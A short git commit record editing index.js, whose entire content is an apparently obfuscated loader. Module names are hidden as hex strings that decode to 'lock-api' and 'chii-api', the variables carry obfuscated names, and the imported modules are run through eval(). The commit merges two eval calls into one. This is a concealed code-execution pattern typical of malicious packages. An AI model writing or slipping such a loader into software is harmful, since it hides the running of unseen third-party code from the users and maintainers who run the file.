ab054a4a66c598acc9f5e473e6049c1fd27cc6b1
Hnuuchii <phdy444@gmail.com>
2024-07-20 06:18:43 +0700

    index.js

--- index.js
+++ index.js
@@ -1,3 +1,3 @@
 const _0x5f43 = require(Buffer.from('6c6f636b2d617069', 'hex').toString('utf8'));
 const _0x5f44 = require(Buffer.from('636869692d617069', 'hex').toString('utf8'));
-eval(_0x5f43); eval(_0x5f44);
+eval(_0x5f43+_0x5f44);
